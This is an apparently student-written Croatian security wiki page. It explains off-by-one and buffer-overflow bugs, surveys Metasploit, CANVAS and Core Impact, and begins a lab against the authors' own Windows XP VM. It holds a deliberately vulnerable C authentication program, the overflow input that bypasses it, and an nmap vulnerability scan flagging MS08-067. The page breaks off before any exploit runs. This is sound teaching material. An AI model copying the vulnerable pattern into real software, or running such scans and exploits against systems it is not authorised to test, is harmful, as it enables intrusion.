<!DOCTYPE html>
<html lang="hr" dir="ltr">
<head>
<meta charset="UTF-8" />
<title>Eksploatacijski frameworkovi - SIS Wiki</title>
<meta name="generator" content="MediaWiki 1.17.0" />
<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Eksploatacijski_frameworkovi&amp;action=creativecommons" rel="meta" />
<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
<meta name="ResourceLoaderDynamicStyles" content="" />
<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
<body class="mediawiki ltr ns-0 ns-subject page-Eksploatacijski_frameworkovi skin-vector">
		<div id="mw-page-base" class="noprint"></div>
		<div id="mw-head-base" class="noprint"></div>
		<!-- content -->
		<div id="content">
			<a id="top"></a>
			<div id="mw-js-message" style="display:none;"></div>
						<!-- firstHeading -->
			<h1 id="firstHeading" class="firstHeading">Eksploatacijski frameworkovi</h1>
			<!-- /firstHeading -->
			<!-- bodyContent -->
			<div id="bodyContent">
				<!-- tagline -->
				<div id="siteSub">Izvor: SIS Wiki</div>
				<!-- /tagline -->
				<!-- subtitle -->
				<div id="contentSub"></div>
				<!-- /subtitle -->
																<!-- jumpto -->
				<div id="jump-to-nav">
					Skoči na: <a href="Eksploatacijski_frameworkovi.html#mw-head">orijentacija</a>,
					<a href="Eksploatacijski_frameworkovi.html#p-search">traži</a>
				</div>
				<!-- /jumpto -->
								<!-- bodytext -->
				<p>Preuzeli temu: Maja Hornung, Dijana Grd, Tin Komlinović
</p>
<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
<ul>
<li class="toclevel-1 tocsection-1"><a href="Eksploatacijski_frameworkovi.html#NAJ.C4.8CE.C5.A0.C4.86E_TEHNIKE_EKSPLOATACIJE"><span class="tocnumber">1</span> <span class="toctext">NAJČEŠĆE TEHNIKE EKSPLOATACIJE</span></a>
<ul>
<li class="toclevel-2 tocsection-2"><a href="Eksploatacijski_frameworkovi.html#FENCEPOST_ERROR"><span class="tocnumber">1.1</span> <span class="toctext">FENCEPOST ERROR</span></a></li>
<li class="toclevel-2 tocsection-3"><a href="Eksploatacijski_frameworkovi.html#PRO.C5.A0IRENJE_FUNKCIONALNOSTI_PROGRAMA"><span class="tocnumber">1.2</span> <span class="toctext">PROŠIRENJE FUNKCIONALNOSTI PROGRAMA</span></a></li>
<li class="toclevel-2 tocsection-4"><a href="Eksploatacijski_frameworkovi.html#BUFFER_OVERFLOW"><span class="tocnumber">1.3</span> <span class="toctext">BUFFER OVERFLOW</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-5"><a href="Eksploatacijski_frameworkovi.html#EKSPLOATACIJSKI_FRAMEWORKOVI_I_KARAKTERISTIKE"><span class="tocnumber">2</span> <span class="toctext">EKSPLOATACIJSKI FRAMEWORKOVI I KARAKTERISTIKE</span></a>
<ul>
<li class="toclevel-2 tocsection-6"><a href="Eksploatacijski_frameworkovi.html#METASPLOIT"><span class="tocnumber">2.1</span> <span class="toctext">METASPLOIT</span></a>
<ul>
<li class="toclevel-3 tocsection-7"><a href="Eksploatacijski_frameworkovi.html#Arhitektura"><span class="tocnumber">2.1.1</span> <span class="toctext">Arhitektura</span></a></li>
<li class="toclevel-3 tocsection-8"><a href="Eksploatacijski_frameworkovi.html#Komponente"><span class="tocnumber">2.1.2</span> <span class="toctext">Komponente</span></a></li>
<li class="toclevel-3 tocsection-9"><a href="Eksploatacijski_frameworkovi.html#Nadogradnja_Metasploit_Framework_projekta"><span class="tocnumber">2.1.3</span> <span class="toctext">Nadogradnja Metasploit Framework projekta</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-10"><a href="Eksploatacijski_frameworkovi.html#CANVAS"><span class="tocnumber">2.2</span> <span class="toctext">CANVAS</span></a></li>
<li class="toclevel-2 tocsection-11"><a href="Eksploatacijski_frameworkovi.html#CORE_IMPACT"><span class="tocnumber">2.3</span> <span class="toctext">CORE IMPACT</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-12"><a href="Eksploatacijski_frameworkovi.html#EKSPLOATACIJA_VIRTUALNE_WINDOWS_XP_MA.C5.A0INE"><span class="tocnumber">3</span> <span class="toctext">EKSPLOATACIJA VIRTUALNE WINDOWS XP MAŠINE</span></a></li>
</ul>
</td></tr></table>
<h2> <span class="mw-headline" id="NAJ.C4.8CE.C5.A0.C4.86E_TEHNIKE_EKSPLOATACIJE">NAJČEŠĆE TEHNIKE EKSPLOATACIJE </span></h2>
<p>Eksploatacija je radnja kojom pokušavamo navesti program da radi ono što nije njegova prvotna namjena, već ono što mi želimo da program radi. To nam omogućuju sigurnosni propusti u programu ili njegovoj okolini. 
</p>
<h3> <span class="mw-headline" id="FENCEPOST_ERROR"> FENCEPOST ERROR </span></h3>
<p>“Jedna od čestih programerskih grešaka je <i>off-by-one error</i>" [<i>Jon Erickson, Hacking – The Art of Exploatation – 2nd edition, No Starch Press, San Francisco</i>]. To je greška gdje programer pogriješi u brojanju za jedan. U engleskom žargonu se naziva fencepost error. Takav naziv je dobila po tipičnom problemu: Ako trebamo izgraditi ogradu od 100 metara,a svakih 10 metara ograde treba biti jedan stup, koliko nam treba stupova? Tipičan odgovor je 10 stupova, ali to nije točan odgovor. Treba nam 11 stupova. Odnosno 10+1. 
Poznati primjer <i>fencepost error</i>-a je propust u <i>OpenSSH</i>. Kod je izgledao ovako:
</p>
<pre class="terminal">
if (id &lt; 0 || id &gt; channels_alloc) {
</pre>
<p>a trebao je izgledati ovako: 
</p>
<pre class="terminal">
if (id &lt; 0 || id &gt;= channels_alloc) {
</pre>
<p>Kod je preuzet iz <i>Jon Erickson, Hacking – The Art of Exploatation – 2nd edition, No Starch Press, San Francisco</i>.
</p><p>Ova naizgled mala greška omogućila je da se korisnici s nižim ovlastima mogu koristiti administratorske ovlasti.
</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Tin.komlinovic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Tin.komlinovic (stranica ne postoji)">Tin.komlinovic</a> 22:50, 2. siječnja 2012. (CET)
</p>
<h3> <span class="mw-headline" id="PRO.C5.A0IRENJE_FUNKCIONALNOSTI_PROGRAMA"> PROŠIRENJE FUNKCIONALNOSTI PROGRAMA </span></h3>
<p>Prilikom proširenja funkcionalnosti programa često se dogode pogreške i propusti u programiranju koji omogućuju eksploataciju programa. Jedan od poznatijih primjera je propust u Microsoft IIS-u (Internet Information Services). IIS je Web server za posluživanje različitih sadržaja na webu. Ti sadržaji mogu biti interaktivni ili statičnog karaktera. Zbog te karakteristike se korisnicima treba omogućiti čitanje i pisanje te izvođenje programa. Korisnici su imali ovlasti da koriste samo određene direktorije. Kako bi sprječili korisnika da uđe u tuđi direktorij, programeri su zabranili korištenje znaka backslash (\). Ta zabrana je dobro funkcionirala dok Microsoft nije odlučio da će postojeći standard za znakove zamijeniti Unicode standardom. Unicode koristi dva bita za zapisivanje svakog znaka i omogućuje podršku za sve specijalne znakove iz svih jezika. S obzirom da se pomoću Unicode-a može prikazati nekoliko tisuća znakova, neki znakovi se mogu prikazati na nekoliko načina. Jedan od tih znakova je i backslash. S obzirom da su programeri onemogućili samo jedan zapis backslasha, korisnici su pomoću drugih zapisa mogli ući u bilo koji direktorij.
</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Tin.komlinovic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Tin.komlinovic (stranica ne postoji)">Tin.komlinovic</a> 22:51, 2. siječnja 2012. (CET)
</p>
<h3> <span class="mw-headline" id="BUFFER_OVERFLOW"> BUFFER OVERFLOW </span></h3>
<p>Jedan od najčešćih ranjivosti programa je <i>Buffer overflow</i> (hrv. prekoračenje kapaciteta međuspremnika).  U mnogim programskim jezicima kao što su C ili C++ se podrazumijeva da programer vodi računa o količini podataka koju pohranjuje u određeni memorijski prostor. Programski jezici ne vode računa o takvim stvarima jer bi ih to bitno zakompliciralo. Do problema dolazi zbog toga što se memorija za određenu varijablu unaprijed zauzme pa ako se u varijablu želi spremiti više podataka od zauzete memorije, ti podaci se jednostavno zapišu u sljedeće memorijske adrese, što može dovesti do prepisivanja sadržaja tih memorijskih adresa. Takvi događaji mogu izazvati rušenje programa, ali ako se dogode u kontroliranim uvjetima mogu omogućiti eksploataciju programa. Najveći problem je što se <i>Buffer overflow</i> vrlo lako previdi. Jedna od mogućih zaštita je provjeravanje duljine podataka koji se pohranjuju u varijablu. 
Primjer <i>Buffer overflow-a</i> iz knjige [<i>Jon Erickson, Hacking – The Art of Exploatation – 2nd edition, No Starch Press, San Francisco</i>]:
</p>
<pre class="cpp">
#include &lt;stdio.h&gt; 
#include &lt;stdlib.h&gt; 
#include &lt;string.h&gt;

int check_authentication(char *password) { 
   int auth_flag = 0; 
   char password_buffer[16];

   strcpy(password_buffer, password);

   if(strcmp(password_buffer, &quot;brillig&quot;) == 0) 
      auth_flag = 1;
   if(strcmp(password_buffer, &quot;outgrabe&quot;) == 0) 
      auth_flag = 1;

   return auth_flag; 
}

int main(int argc, char *argv[]) { 
   if(argc &lt; 2) {
      printf(&quot;Usage:&#160;%s &lt;password&gt;\n&quot;, argv[0]);
      exit(0); 
   }

   if(check_authentication(argv[1])) { 
      printf(&quot;\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n&quot;); 
      printf(&quot; Access Granted.\n&quot;); printf(&quot;-=-=-=-=-=-=-=-=-=-=-=-=-=-\n&quot;);
   } else {
       printf(&quot;\nAccess Denied.\n&quot;);
   } 
}

</pre>
<p>Kao što se može i zaključiti iz koda, namjena programa je ispisati Access Granted ako korisnik unese lozinku <i>brillig</i> ili <i>outgrabe</i>, a ako unese neku drugu lozinku ispisati <i>Access Denied</i>. Program radi dobro dok god je unesena lozinka veličine do 16 znakova. Ako korisnik unese lozinku AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, program će ispisati <i>Access Granted</i>, što predstavlja veliki problem. Do ovakvog rezulata je došlo jer su se podaci iz <i>password_buffer</i>-a “prelili” u <i>auth_flag</i> koji je poprimio vrijednost drugačiju od 0 što znači da će program ispisati <i>Access Granted</i>.
</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Tin.komlinovic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Tin.komlinovic (stranica ne postoji)">Tin.komlinovic</a> 22:52, 2. siječnja 2012. (CET)
</p>
<h2> <span class="mw-headline" id="EKSPLOATACIJSKI_FRAMEWORKOVI_I_KARAKTERISTIKE"> EKSPLOATACIJSKI FRAMEWORKOVI I KARAKTERISTIKE </span></h2>
<p>	Prije nego što vidimo koji su to najpoznatiji alati za penetracijska testiranja, trebalo bi utvrditi još neke stvari. Već smo upoznati sa time da se područje informacijske sigurnosti sve više i sve brže razvija, a zahvaljujući Internetu je svako računalo u opasnosti od napada zlonamjernih korisnika. Kako bi se što lakše omogućila sigurnost informacijskih sustava, razvijeni su mnogi alati koji olakšavaju njeno izvođenje. <br /><br />
	Penetracijska testiranja su uglavnom jako teška i komplicirana pa su prvenstveno zbog toga razvijeni eksploatacijski frameworkovi. Oni se mogu definirati kao skup skripti i alata, koji pomoću skupa predefiniranih skripti automatiziraju i olakšavaju eksploataciju poznatih ranjivosti  u aplikacijama i operacijskim sustavima. Prvo su napravljeni kao razvojni alat koji bi mrežnim i sistemskim administratorima olakšao penetracijska testiranja, međutim danas je iznimno koristan i negativcima. <br /><br />
	Eksploatacijski frameworkovi koriste zbirku poznatih ranjivosti za određeni sustav i kreiraju skup napada koji bi se najvjerojatnije dogodili u stvarnosti. Kako se otkrivaju nove ranjivosti dodaje ih se u frameworkove kako bi bili ažurni. Sve predefinirane skripte se nalaze u instalacijskom paketu, tako da nema potrebe instalirati dodatni softver ili modificirati skripte kako bi se uspješno izvršavala eksploatacija – potrebno je samo podesiti neke parametre unutar programa. Jedna od najvažnijih postavki koje korisnik treba konfigurirati je "Payload". Koristan sadržaj (engl. payload)  je kod koji se izvršava na odredišnom sustavu nakon što se eksploatacijom otvori komunikacija sa metom. Upravo koristan teret i exploit čine temelj funkcioniranja frameworkova. <br /><br />
	Još jedna stvar koju ovdje treba spomenuti je shellcode generator. Korisni teret je u osnovi skup instrukcija ili skripta koje su pisane shellcodeom. Međutim, mnogi ne znaju programirati u shellcodeu, pa se pomoću generatora standardni kod konvertira u "shellcode" kojega mogu koristiti eksploatacijski frameworkovi. <br /><br />
	Najvažnija među mnogim prednostima koje omogućuju eksploatacijski frameworkovi je modularnost eksploatacijskog koda. Prije nego su eksploatacijski frameworkovi razvijeni, exploiti i koristan teret su se teško spajali i najčešće su radili samo jednu stvar (na primjer kreiranje novog korisnika na kompromitiranom sustavu). Ponovna upotreba koda i modularnost su omogućile da eksploatacijske skripte postanu čišće i konciznije pošto je temeljna funkcionalnost već bila uključena u biblioteku frameworkova. <br /><br />
	Danas se napadači računala (bilo oni zlih namjera ili profesionalni penetracijski testeri) većinom pouzdaju u eksploatacijske frameworkove za realizaciju svojih napada. Danas postoji već dosta alata, a najpoznatiji (koje ću ujedno ovdje i opisati) su Metasploit (open source),  te komercijalni alati Core Impact i CANVAS. Metasploit nam je svima dostupan i zbog toga ću njemu posvetiti više stranica. Core Impact i CANVAS ću spomenuti samo ukratko jer to su poprilično skupi alati i zbog toga su male šanse da ćete se susresti sa njima.<br />
--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mhornung&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mhornung (stranica ne postoji)">Mhornung</a><br /><br />
</p><p><br />
</p>
<h3> <span class="mw-headline" id="METASPLOIT"> METASPLOIT </span></h3>
<p>	S razvojem raznih alata koji su pojednostavili osiguravanje informacijskih sustava javilo se i nekoliko problema. Jedan od njih je i međusobna nekompatibilnost zbog toga što svi ti alati imaju različita sučelja. Zbog toga je nastao Metasploit Framework koji je u stvari biblioteka specifičnih koraka koji nam olakšavaju rad s različitim alatima. Pošto je postojala velika potreba za takvim okruženjem, Metasploit je brzo prerastao u okolinu za razvoj, održavanje i pokretanje ranjivosti, a nama najvažnije – u okolinu za izvođenje penetracijskih provjera.<br /><br />
	Metasploit je open source eksploatacijski framework koji je nastao 2003. godine. Upravo zbog toga što je besplatan ga vjerojatno više koriste hakeri nego dobronamjerni profesionalci. Napisao ga je HD Moore koristeći programski jezik Perl, a trenutna verzija je pisana u jeziku Ruby. Danas Metasploit sadrži više stotina exploitova, većinom za Microsoft Windows platformu. On pruža cijelu infrastrukturu za automatiziranje složenih, ali i šablonskih zadataka, pomaže u identificiranju sigurnosnih problema, provjerava ublažavanje ranjivosti i upravlja stručno vođenim procjenama sigurnosti, omogućavajući obavještavanje o sigurnosnim rizicima. Njegove mogućnosti uključuju eksploataciju, revizije lozinke, skeniranje web aplikacija i socijalni inženjering. Metasploit projekt je promijenio postojeći način razvoja ranjivosti – izrada novih ranjivosti je omogućena čak i početnicima. Svi korisnici mogu surađivati u Metasploitu i iznijeti svoja otkrića u izvješćima. Zahvaljujući upravo velikoj zajednici korisnika postoje brojni dodatci koji nadopunjuju osnovni projekt dodatnim funkcionalnostima.<br /><br />
	Zbog svoje specifične arhitekture podržava veliki broj modula koji se koriste u različitim fazama provjeravanja, te se danas smatra jednim od glavnih alata koji podržavaju sve faze penetracijskog ispitivanja sustava.<br />
--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mhornung&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mhornung (stranica ne postoji)">Mhornung</a><br /><br />
</p><p><br />
</p>
<h4> <span class="mw-headline" id="Arhitektura"> Arhitektura </span></h4>
<p>Metasploit Framework ima prilagodljivu arhitekturu koja omogućuje jednostavnu nadogradnju projekta stvaranjem novih modula, biblioteka i drugih dodataka. Na slici je prikazana skica njegove arhitekture.<br /><br />
</p>
<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Arhitektura.jpg" class="image"><img alt="Arhitektura.jpg" src="../images/thumb/2/22/Arhitektura.jpg/600px-Arhitektura.jpg" width="600" height="426" /></a></div></div>
<p>Prema slici vidimo da su alati, dodaci, biblioteke i moduli dio ove arhitekture. Ovdje ću ih detaljnije opisati.<br /><br />
</p><p><b>Alati</b> (engl. <i>Tools</i>) se koriste za obavljanje konkretnih radnji. Metasploit podržava velik broj alata za sve faze penetracijskog ispitivanja (na primjer Nmap za analizu udaljenog računala).<br /><br />
</p><p><b>Dodatci</b> (engl. <i>Plugins</i>) predstavljaju posebne elemente koji komuniciraju s ostalim alatima pomoću programskih sučelja (Msf::Core, Msf::Base). Oni se razvijaju u svrhu olakšanja ili automatizacije određenih radnji, a dostupni su isključivo putem konzole. Dodatcima se proširuje funkcionalnost osnovnog projekta jer se svi oni očituju u obliku novih naredbi.<br /><br />
</p><p><b>Biblioteke</b> (engl.<i> Libraries</i>) predstavljaju osnovne funkcionalnosti koje su grupirane su u 3 skupine:<br />
</p>
<ol><li>Msf::Base – pojednostavljenje osnovnog programskog sučelja; olakšava korisnicima interakciju sa raznim alatima.<br />
</li><li>Msf::Core – osnovno programsko sučelje koje definira Metasploit Framework; koriste ga svi alati i moduli za interakciju sa Metasploit projektom.<br />
</li><li>Rex – biblioteka koja sadrži osnovne funkcionalnosti koje se koriste u raznim dijelovima projekta i mnogim modulima. Također uključuje podršku za rad s raznim mrežnim protokolima (na primjer HTTP i SMB), a omogućuje i upravljanje znakovnim nizom.<br /><br />
</li></ol>
<p><b>Moduli</b> (engl. <i>Modules</i>)  su dijelovi od kojih se sastoji Metasploit Framework projekt, a koje korisnik može koristiti prilikom ispitivanja sustava. Postoji više kategorija modula:<br />
</p>
<ol><li>Koristan teret (engl. Payload) – konkretan niz koraka koji iskorištava određenu ranjivost. Ne sadrži nikakve podesive parametre ni sučelje prema korisniku. Pomoću alata msfpayload je moguće stvaranje i izvoz korisnog tereta.<br />
</li><li>Ranjivost (engl. Exploit) – skup koraka u određenom programskom jeziku koji iskorištavaju propust na sustavu. Ostvaruju određeni cilj tako što se na odredišnom računalu izvodi koristan teret koji sadržavaju u sebi. Exploitovi su dijelovi koda koji se mogu prepraviti i prilagoditi žrtvi. Postoje dvije vrste ranjivosti – aktivna (pokreće je korisnik iz konzole) i pasivna (vezu uspostavlja žrtva).<br />
</li><li>Koder (engl. Encoder) – ponekad  treba zaobići sustav za otkrivanje napada (engl. Intrusion Detection System) pa je potrebno kodirati ili zaštititi payload. Kodiranje se obavlja pomoću jednog ili više algoritama, a moduli se pozivaju msfencode naredbom iz naredbenog retka operacijskog sustava.<br />
</li><li>Prazne naredbe (engl. Nop – No Operation) – odgađaju izvođenje programa, podržavaju ih svi programski jezici, a to su uglavnom naredbe sleep i delay. Ove naredbe se na razini procesora mogu izvesti i kao prazne naredba.<br />
</li><li>Pomoćni (engl. Auxiliary) – kao što samo ime govori, ovo su moduli koji sadrže pomoćne funkcionalnosti, koje mogu biti općenite ili specifične. Oni služe za ubrzavanje ili olakšavanje pojedinih radnji, ali ne iskorištavaju ranjivost niti se koriste za dobivanje pristupa meti. <br />
</li></ol>
<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mhornung&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mhornung (stranica ne postoji)">Mhornung</a><br /><br />
</p>
<h4> <span class="mw-headline" id="Komponente"> Komponente </span></h4>
<p>Metasploit Framework se sastoji od mnogo različitih modula i komponenata, a pomoću mnogih se u stvari proširuje osnovna funkcionalnost Metasploit projekta. Ovdje ću spomenuti neke od tih komponenata koje se najčešće koriste.<br /><br />
</p><p><br />
<b>Meterpreter</b><br />
	Penetracijska provjera ne završava dobivanjem pristupa, nego je potrebno dodatno dokazati propuste izvođenjem drugih radnji pomoću preuzetog računala. Meterpreter je modul koji se koristi upravo u toj post-penetracijskoj fazi. Kada se željenim propustom uspije pristupiti određenom računalu, potrebno je Meterpreter prebaciti kao koristan teret. Kada je prebačen, on se samostalno pokreće na računalu žrtvi i korisniku omogućuje pristup mnogim funkcionalnostima Metasploit Frameworka (najčešće se koriste funkcionalnosti krađe lozinki, pristupa povjerljivim korisničkim informacijama i prikrivanja tragova o napadu).<br /><br />
	Nije rijetkost da prilikom preuzimanja ovlasti na nekom računalu imamo samo ograničen pristup – to je stoga što se dogodi da napadom preuzmemo korisnički račun s ograničenim ovlastima. U tom slučaju možemo samostalno kreirati novog korisnika i dodijeliti mu ovlasti kakve želimo. Taj modul se na žalost još ne nalazi u Meterpreteru, nego korisnik mora sam kreirati novog korisnika u naredbenom retku. Ako se pak dogodi da račun koji smo preuzeli ima toliko ograničene ovlasti da ne možemo čak niti kreirati novog korisnika, moramo koristiti malo drugačije ranjivosti i module kako bi uspjeli dobiti pristup korisničkom računu sa većim ovlastima.<br /><br />
	Kada se preuzmu ovlasti nad jednim računalom, može ih se iskoristiti za preuzimanje ovlasti nad ostalim računalima u lokalnoj mreži tog računala. Meterpreter nudi već gotove module koji olakšavaju taj postupak širenja ovlasti s jednog računala na druga (to se naziva stožiranje, engl. pivoting).<br /><br />
	Meterpreter predstavlja sasvim odvojeno okruženje  od ostatka Metasploit projekta, te je dijelom napravljen programskom jeziku C (zato da bi se mogao koristiti na svim operacijskim sustavima). Koga zanimaju naredbe u Meterpreteru → <a href="http://www.offensive-security.com/metasploit-unleashed/Metasploit_Meterpreter_Basics" class="external free" rel="nofollow">http://www.offensive-security.com/metasploit-unleashed/Metasploit_Meterpreter_Basics</a><br /><br />
</p><p><br />
<b>PCAP</b><br />
	Prilikom obavljanja penetracijske provjere su važni alati za snimanje prometa,  a jedno od najpopularnijih programskih sučelja za praćenje prometa je PCAP. Ovaj dodatak može pohraniti do 200 000 paketa te prikupljene informacije poslati korisničkom računalu na analizu. Ove informacije se mogu pregledavati pomoću alata za praćenje prometa, kao što je Wireshark. Jedna od funkcionalnosti ovog dodatka je praćenje prometa na računalu žrtve pomoću Meterpreter konzole bez potrebe za zapisivanjem stanja na disk, što je korisno kada želimo promatrati vrste informacija koje se šalju u mreži.
<br /><br /><br />
</p><p><b>MSFpayload</b><br />
	Ova komponenta korisnicima omogućuje proizvodnju programskog koda (u jezicima C, Visual Basic, JavaScript i Ruby), izvršnih datoteka i ranjivosti koje se mogu koristiti izvan Metasploit okruženja. Programski jezik ranjivosti može biti različit, ovisno o meti i platformi na kojoj se zasniva, a to olakšava provjeru sustava. Na primjer, ako želimo dokazati ranjivost zasnovanu na web pregledniku, najbolje je koristiti ranjivost napisanu u JavaScript jeziku.
</p><p><br />
--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mhornung&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mhornung (stranica ne postoji)">Mhornung</a><br /><br />
</p>
<h4> <span class="mw-headline" id="Nadogradnja_Metasploit_Framework_projekta"> Nadogradnja Metasploit Framework projekta</span></h4>
<p>	Metasploit Framework projekt je iznimno popularan i stoga ga, iako postoji službeni tim, u stvari održava velika zajednica korisnika. Korisnici dodaju svoje module i tako razvijaju osnovni projekt. Spomenuti ću nekoliko zanimljivih komponenti koje su nastale upravo zahvaljujući korisnicima.
<br /><br />
<b>Armitage</b><br />
	Armitage je novo grafičko sučelje Metasploit projekta koje olakšava upravljanje napadom pomoću vizualiziranja žrtve, predlaganja napada i omogućavanjem pristupa naprednim funkcijama Metasploit projekta. Napravljen je kao nadogradnja osnovnog projekta, oslanja se na programski jezik Java, a prilikom pokretanja se spaja na lokalnu Metasploit bazu podataka kako bi omogućio rad sa svim modulima. Nakon njegovog pokretanja moguće je korištenje većine mogućnosti Metasploit Framework projekta. Ranjivosti su grupirane u skupine i podskupine koje detaljnije određuju ranjivost ili modul koji se želi koristiti. Kako se većina penetracijskih provjera radi u skupinama i svaki član ima svoje dužnosti, jedna od korisnih Armitageovih funkcionalnosti uključuje zajednički rad svih članova skupine. Armitage je pogodan za korisnike koji su naviknuti na izvođenje penetracijskih testova, ali nisu upoznati sa Metasploit projektom.<br /><br />
</p><p><br />
<b>SET –  Social Engineering Toolkit</b><br />
	U početku Metasploit projekt nije podržavao niti jedan modul orijentiran na iskorištavanje ljudskih slabosti i zbog toga je razvijen novi alat – SET. On pokriva propust koji je nastao u ranijim penetracijskim provjerama koje su se oslanjale isključivo na ispitivanje računala, ali ne i na provjeru korisnika. SET je postao standard za izvođenje penetracijskih provjera nad ljudskim dijelom informacijskog sustava, a oslanja se na područje društvenog inženjeringa. Većina sigurnosnih stručnjaka smatra da su ljudi najveća sigurnosna prijetnja informacijskim sustavima jer se napadi usmjeravaju na ljude koji sporo usvajaju nova ponašanja. SET ima veliku bazu znanja o ljudskim slabostima i nudi klasično konzolno sučelje za pokretanje napada. Napadi se do korisnika dostavljaju putem USB uređaja, e-maila, web stranica i raznim drugim sredstvima. Metoda iskorištavanja se temelji na zavaravanju zaposlenika porukom kako bi se zaobišao neki sigurnosni mehanizam.<br /><br />
--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mhornung&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mhornung (stranica ne postoji)">Mhornung</a><br /><br />
</p><p><br />
</p>
<h3> <span class="mw-headline" id="CANVAS">CANVAS</span></h3>
<p>	CANVAS je komercijalni eksploatacijski framework pokrenut 2002. godine od strane Immunity Inc. Plaća se po modelu pretplata i izvorni kod je dostupan samo onima koji ga kupe. U paketu dolazi sa automatskim sustavom eksploatacije, više stotina exploitova, a u prosjeku se svaki mjesec doda 4 nova exploita koji se strogo provjeravaju prije objavljivanja, a razvojni tim je dostupan putem maila. Exploitovi se objavljuju prema prioritetu, odnosno prvo se objavljuju oni koji imaju visoku razinu ranjivosti. Dokumentacija i demonstracije novih exploitova se rade pomoću flash filmova.  Korisnici nisu ograničeni na exploitove napravljene u Immunityju jer nekoliko drugih dobavljača nudi exploit pakete za CANVAS.<br /><br />
	Ažurira se redovito svakoga mjeseca, a korisnike se o tome obavještava putem e-maila. 	Također nema ograničenja vezanih uz IP adrese žrtve. Podržan je na platformama Windows, Linux i MacOSX, kao i na ostalim Python okruženjima kao što su mobilni uređaji.<br />
Ako vas zanimaju detalji možete ih pronaći na stranici <a href="http://www.immunitysec.com/products-canvas.shtml" class="external free" rel="nofollow">http://www.immunitysec.com/products-canvas.shtml</a><br /><br />
--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mhornung&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mhornung (stranica ne postoji)">Mhornung</a><br /><br />
</p>
<h3> <span class="mw-headline" id="CORE_IMPACT">CORE IMPACT</span></h3>
<p>	Core Impact je također komercijalni eksploatacijski framework i dosta skuplji od CANVAS-a. Napravljen je 1996. godine od strane CORE Security Technologies i predstavljen kao prvi potpuno automatizirani proizvod za penetracijsko testiranje. Ima dodatnu funkcionalnost stvaranja izvještaja. Kao i kod CANVAS-a, moduli se provjeravaju prije i nakon objave i kontinuirano se ažuriraju. Omogućuje tehnologiju koja pomaže napadaču prikupiti informacije o kontroli kompromitiranih sustava. Zbog njegove cijene ga uglavnom koriste kompanije.<br />
Detalje možete pronaći na stranici <a href="http://www.coresecurity.com/content/core-impact-overview" class="external free" rel="nofollow">http://www.coresecurity.com/content/core-impact-overview</a> <br /><br />
--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mhornung&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mhornung (stranica ne postoji)">Mhornung</a><br /><br />
</p>
<h2> <span class="mw-headline" id="EKSPLOATACIJA_VIRTUALNE_WINDOWS_XP_MA.C5.A0INE">EKSPLOATACIJA VIRTUALNE WINDOWS XP MAŠINE </span></h2>
<p>Testiranja iz ovog poglavlja su obavljena na virtualnoj mašini instaliranoj pomoću Parrallel Desktop softvera na Windows XP Service Pack 2 operacijskom sustavu. 
</p><p>Kako bi mogili napasti virtualnu mašinu, prvo moramo saznati njezinu IP adresu.  S obzirom da smo vlasnici virtualne mašine, znamo njezinu IP adresu. IP adresa virtualne mašine je 10.211.55.6.  Sada kada znamo koja je IP adresa virtualne mašine, možemo skenirati njezine ranjivosti.  Skeniranje ćemo provesti unutar Metasploita, ali korištenjem nmap plugina. Nmap je program za skeniranje ranjivosti sustava, više o programu je moguće saznati na <a href="http://nmap.org" class="external free" rel="nofollow">http://nmap.org</a>. Koristit ćemo zastavice sT – koja označava “prikrivenu TCP konekciju” i –A koja označava detekciju operacijskog sustava.
</p>
<pre>
nmap -sT -A --script=smb-check-vulns -P0 10.211.55.6
</pre>
<p>Nakon izvršenja naredbe rezultat izgleda ovako:
</p>
<pre>
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.211.55.6
Host is up (0.00023s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OS: Windows

Host script results:
| smb-check-vulns: 
|   MS08-067: VULNERABLE
|   Conficker: Likely CLEAN
|   regsvc DoS: CHECK DISABLED (add '--script-args=unsafe=1' to run)
